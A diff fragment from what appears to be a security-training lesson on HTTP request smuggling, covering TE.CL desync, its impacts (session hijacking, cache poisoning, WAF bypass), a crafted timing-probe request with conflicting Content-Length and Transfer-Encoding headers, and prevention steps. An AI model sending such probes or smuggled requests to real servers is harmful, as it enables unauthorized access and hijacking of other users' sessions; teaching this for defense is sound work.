+**Back-end (uses CL):** Reads exactly 3 bytes: \`8\\r\\n\`. Then \`SMUGGLED\\r\\n0\\r\\n\` is treated as the start of a NEW request.
+
+**Result:** Same as CL.TE — a smuggled request that bypasses front-end security.
+
+## Impact of Request Smuggling
+
+**Session hijacking:** Smuggle a request that gets processed on another user's connection, stealing their session cookie.
+
+**Access control bypass:** Smuggle a request to an admin endpoint that the front-end would normally block.
+
+**Cache poisoning:** Smuggle a request that gets cached, serving malicious content to other users.
+
+**WAF bypass:** Smuggle malicious payloads past the front-end WAF.
+
+## Detection
+
+**Timing attack:**
+\`\`\`http
+POST / HTTP/1.1
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+X
+\`\`\`
+
+If the server times out waiting for more data, it's using Transfer-Encoding. If it responds immediately, it's using Content-Length.
+
+**Burp Suite:** Use the HTTP Request Smuggler extension to automatically detect CL.TE and TE.CL vulnerabilities.
+
+## Prevention
+
+1. **Use HTTP/2 end-to-end** — HTTP/2 binary framing eliminates the Content-Length vs Transfer-Encoding ambiguity entirely
+2. **Normalize requests at the front-end** — Remove or reject requests with both CL and TE headers
+3. **Ensure consistent parsing** — Front-end and back-end must agree on which header to use
+4. **Disable Transfer-Encoding** if not needed
 
 :::checkpoint
-You can identify CL.TE and TE.CL desync vulnerabilities and understand request smuggling fundamentals.
-:::
-`,
+You understand how HTTP request boundaries work, why CL.TE and TE.CL desync creates smuggling vulnerabilities, and how to detect and prevent them.
+:::`,
         aiPrompt: '',
         labUrl: 'https://portswigger.net/web-security/request-smuggling/lab-server-side-parameter-pollution-in-query-string',
         labTitle: 'Request Smuggling: Server-Side Parameter Pollution',
